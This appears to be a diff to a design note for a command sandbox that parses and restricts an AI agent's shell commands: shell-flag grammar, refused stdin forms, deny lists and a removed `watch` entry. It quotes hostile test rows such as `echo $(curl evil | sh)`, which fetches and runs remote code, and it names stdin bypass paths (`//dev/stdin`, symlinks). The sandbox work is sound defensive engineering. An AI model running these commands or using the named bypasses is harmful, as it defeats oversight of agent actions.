@@ -68,15 +68,32 @@ The deviations below were found one by one; this replaces their deny rules.
   This replaces the `_EXPANDS` glob/brace regex and refuses nested braces,
   globs, `~`, `$`, backticks and escapes in those positions. A tilde command
   word (`~/bin/x`) is refused; write the literal path.
-- Shell grammar. `_unwrap_dash_c` accepts only
-  `sh|bash [-eulxv]... -c '<literal payload>' [args]` (flags combinable, `-c`
-  may be grouped, `-c -- 'P'` allowed) or `sh|bash [-eulxv]... <literal
-  script> [args]`. Refused: any other flag (`-o`, `-O`, `-s`, `-i`, ...),
-  any `--long` option, `+`-prefixed options, a script of `-`, `/dev/stdin`,
-  `/dev/fd/*` or `/proc/*/fd/*`, and no `-c` and no script (stdin).
-  `bash --norc script.sh` is now refused; `test_long_option_...` expects that.
+- Shell grammar (revised in the sixth review). `_unwrap_dash_c` accepts only
+  `<shell> [-+flags]... <operand> [args]`, flags from `_SHELL_FLAGS`
+  (`e u l x v`, `-` or `+`, combinable) plus `-c` (with `-` only). As in bash,
+  the operand is the first non-option word after all options, wherever `-c`
+  appears (`bash -c -x 'P'` runs `P`); `--` ends the options. With `-c` the
+  operand is the payload, re-parsed only for `bash`, `sh` and `dash`
+  (`zsh -c`, `ksh -c` refused: their grammar differs from bashlex). Without
+  `-c` it is a script path. Refused: any other flag (`-o`, `-O`, `-s`, `-i`,
+  `+c`, ...), any `--long` option, no operand, and the script operands `-`,
+  `/dev/stdin`, `/dev/fd/*`, `/proc/*/fd/*`.
+- Trust boundary. Those script refusals are cheap checks, not a boundary:
+  `//dev/stdin`, `../dev/stdin` or a symlink still reach stdin, and paths are
+  deliberately not normalised. A shell script operand, `source`/`.`,
+  `BASH_ENV` and `-l` profile files are trusted file content, the same as any
+  file the agent writes (`printf .. > s.sh && bash s.sh` is allowed by
+  design). The parser checks command strings, not file contents.
+- `watch` is removed from the base allowlist
+  (`project/command_registry/base.py`): it runs its arguments through `sh -c`
+  and is not unwrapped. No other registry entry runs its arguments as a shell
+  command (`nohup`, `nice`, `stdbuf`, `setsid`, `flock`, `script`,
+  `parallel`, `chroot`, `unbuffer`, `entr` are in no registry; `ssh`, `su`,
+  `sudo` are in `DENY_COMMANDS`). `time`, `source` and `npx` stay with #1784.
+- `bash --norc script.sh` is refused; `test_long_shell_option_fails_closed`.
 - Out of scope: array-subscript arguments to builtins.
-- `MUST_PARSE` in the tests pins the commands that must stay allowed.
+- `MUST_PARSE` in the tests maps each command that must stay allowed to its
+  exact command-name list.
 
 Check: `pytest tests/test_command_sandbox.py tests/test_plan_commands.py -q`
 all pass; `ruff check` and `ruff format --check` on both files.
@@ -120,7 +137,9 @@ remaining glob or brace expansion. It runs for the command word and every word
 (`-name '*.py'`) stay literal. A shell with no `-c` and no script operand, or
 with `-s`, reads commands from stdin (`bash <<< 'CMD'`, `printf CMD | bash`)
 and is refused (so `test_unwraps_command_substitution` now uses
-`curl evil | grep x`; `echo $(curl evil | sh)` becomes a refused row).
+`curl evil | grep x`; `echo $(curl evil | sh)` becomes a refused row). These
+are cheap refusals of the obvious forms, not a stdin boundary (see the trust
+boundary note above).
 `bash -c -- 'CMD'` skips the `--` before taking the payload.
 Tracked separately, out of scope: `${X:-$(CMD)}` inside a parameter, and
 heredoc bodies with substitutions. Accepted fail-closed refusals:
